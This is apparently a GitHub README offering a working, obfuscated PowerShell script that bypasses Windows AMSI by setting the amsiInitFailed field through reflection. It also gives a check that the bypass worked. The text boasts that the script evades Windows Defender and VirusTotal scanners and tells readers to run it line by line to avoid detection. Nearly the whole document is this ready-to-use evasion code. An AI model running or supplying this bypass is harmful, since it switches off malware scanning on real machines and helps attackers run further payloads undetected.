
![Screenshot 2025-06-10 111757](https://github.com/user-attachments/assets/7d7063a6-bb2f-4bd5-a1a4-e83f5ececa8a)

# Bypass ASMI!

This is an advanced ASMI bypass that currently isn't picked up by Windows defender or any of the anti virus softwares on VirusTotal.

You should run this script line by line, don't just execute it .\pwn.ps1 it might get detected if you do that.

But just running it line by line is undetected currently.

It's bypassed ASMI on prolabs from HackTheBox and even on my personal computer.

```powershell
$e=[Ref].('Assem'+'bly').('Ge'+'t'+'Ty'+'pe')(([string]::Join('', [char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))))
$n='Non'+'Public'
$s='Static'
$f=$e.('Ge'+'t'+'Fi'+'eld')(([string]::Join('', [char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s))
$t=[type[]]@([object],[bool])
$m=$f.('Ge'+'t'+'Ty'+'pe')().('Ge'+'t'+'Me'+'tho'+'d')('Se'+'t'+'Val'+'ue', $t)
$m.('In'+'vo'+'k'+'e')($f, @($null, $true))
```

# Check if it Worked!

This should return True if it worked and it'll return False if the bypass failed.

```powershell
$e=[Ref].('Assem'+'bly').('Ge'+'t'+'Ty'+'pe')(([string]::Join('',[char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));
$n='Non'+'Public'
$s='Static'
$f=$e.('Ge'+'t'+'Fi'+'eld')(([string]::Join('',[char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s)
$f.('Ge'+'t'+'Val'+'ue')($null)
```
